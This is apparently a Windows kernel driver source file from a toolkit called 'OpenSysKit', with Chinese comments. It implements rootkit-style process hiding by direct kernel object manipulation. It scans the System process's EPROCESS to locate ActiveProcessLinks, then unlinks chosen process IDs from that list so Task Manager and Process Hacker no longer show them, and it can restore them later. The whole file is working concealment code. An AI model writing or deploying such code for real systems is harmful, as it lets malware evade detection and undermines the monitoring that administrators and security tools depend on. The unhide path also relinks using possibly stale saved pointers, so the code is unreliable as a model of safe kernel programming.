#ifndef NTDDI_VERSION
#define NTDDI_VERSION 0x0A000008
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00
#endif

#include <ntifs.h>
#include "dkom.h"

// ========== DKOM 进程隐藏 ==========
//
// NtQuerySystemInformation(SystemProcessInformation) 通过遍历
// EPROCESS.ActiveProcessLinks 双向链表枚举进程，将目标节点从链表中
// 摘除后，任务管理器和 Process Hacker 等工具都看不到该进程。
//
// ActiveProcessLinks 偏移定位：
//   在 PsInitialSystemProcess（PID=4）的 EPROCESS 中，扫描 0x200~0x600
//   范围找到值为 4 的 HANDLE 字段（UniqueProcessId），其后 +8 即为
//   ActiveProcessLinks。Win10 19041 实际偏移为 0x448，Win11 22H2 为 0x448，
//   动态扫描兼容未来小版本变动。
//
// 摘除后将节点 Flink/Blink 指向自身，保证其他代码遍历该节点时不崩溃，
// 同时保存原始指针用于恢复。
//

#define MAX_HIDDEN_PIDS 32

typedef struct _HIDDEN_ENTRY {
    ULONG       ProcessId;
    PLIST_ENTRY OldFlink;
    PLIST_ENTRY OldBlink;
} HIDDEN_ENTRY;

static HIDDEN_ENTRY g_HiddenTable[MAX_HIDDEN_PIDS] = {};
static ULONG        g_HiddenCount = 0;
static KSPIN_LOCK   g_HiddenLock;
static BOOLEAN      g_Initialized = FALSE;
static ULONG        g_LinksOffset = 0;

static ULONG FindActiveLinksOffset()
{
    PUCHAR base = (PUCHAR)PsInitialSystemProcess;
    for (ULONG off = 0x200; off < 0x600; off += 8) {
        if (*(PULONG_PTR)(base + off) != 4) continue;
        PLIST_ENTRY candidate = (PLIST_ENTRY)(base + off + 8);
        if (MmIsAddressValid(candidate) &&
            MmIsAddressValid(candidate->Flink) &&
            MmIsAddressValid(candidate->Blink)) {
            DbgPrint("[OpenSysKit] [DKOM] ActiveProcessLinks @ EPROCESS+0x%X\n", off + 8);
            return off + 8;
        }
    }
    DbgPrint("[OpenSysKit] [DKOM] failed to locate ActiveProcessLinks offset\n");
    return 0;
}

static VOID EnsureInit()
{
    if (!g_Initialized) {
        KeInitializeSpinLock(&g_HiddenLock);
        g_LinksOffset = FindActiveLinksOffset();
        g_Initialized = TRUE;
    }
}

NTSTATUS HideProcess(ULONG ProcessId)
{
    if (ProcessId == 0 || ProcessId == 4) return STATUS_ACCESS_DENIED;

    EnsureInit();
    if (g_LinksOffset == 0) return STATUS_UNSUCCESSFUL;

    PEPROCESS process = nullptr;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) return status;

    KIRQL irql;
    KeAcquireSpinLock(&g_HiddenLock, &irql);

    // 已在隐藏表中则幂等返回
    for (ULONG i = 0; i < g_HiddenCount; i++) {
        if (g_HiddenTable[i].ProcessId == ProcessId) {
            KeReleaseSpinLock(&g_HiddenLock, irql);
            ObDereferenceObject(process);
            return STATUS_SUCCESS;
        }
    }

    if (g_HiddenCount >= MAX_HIDDEN_PIDS) {
        KeReleaseSpinLock(&g_HiddenLock, irql);
        ObDereferenceObject(process);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    PLIST_ENTRY entry = (PLIST_ENTRY)((PUCHAR)process + g_LinksOffset);
    PLIST_ENTRY flink = entry->Flink;
    PLIST_ENTRY blink = entry->Blink;

    g_HiddenTable[g_HiddenCount++] = { ProcessId, flink, blink };

    // 摘除节点，自身成单节点环
    flink->Blink = blink;
    blink->Flink = flink;
    entry->Flink = entry;
    entry->Blink = entry;

    KeReleaseSpinLock(&g_HiddenLock, irql);
    ObDereferenceObject(process);

    DbgPrint("[OpenSysKit] [DKOM] PID=%lu hidden\n", ProcessId);
    return STATUS_SUCCESS;
}

NTSTATUS UnhideProcess(ULONG ProcessId)
{
    EnsureInit();

    PEPROCESS process = nullptr;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) return status;

    KIRQL irql;
    KeAcquireSpinLock(&g_HiddenLock, &irql);

    ULONG idx = ULONG_MAX;
    for (ULONG i = 0; i < g_HiddenCount; i++) {
        if (g_HiddenTable[i].ProcessId == ProcessId) { idx = i; break; }
    }

    if (idx == ULONG_MAX) {
        KeReleaseSpinLock(&g_HiddenLock, irql);
        ObDereferenceObject(process);
        return STATUS_NOT_FOUND;
    }

    PLIST_ENTRY entry = (PLIST_ENTRY)((PUCHAR)process + g_LinksOffset);
    PLIST_ENTRY flink = g_HiddenTable[idx].OldFlink;
    PLIST_ENTRY blink = g_HiddenTable[idx].OldBlink;

    entry->Flink = flink;
    entry->Blink = blink;
    flink->Blink = entry;
    blink->Flink = entry;

    // 从记录表中移除（填补空洞）
    g_HiddenTable[idx] = g_HiddenTable[--g_HiddenCount];
    RtlZeroMemory(&g_HiddenTable[g_HiddenCount], sizeof(HIDDEN_ENTRY));

    KeReleaseSpinLock(&g_HiddenLock, irql);
    ObDereferenceObject(process);

    DbgPrint("[OpenSysKit] [DKOM] PID=%lu unhidden\n", ProcessId);
    return STATUS_SUCCESS;
}
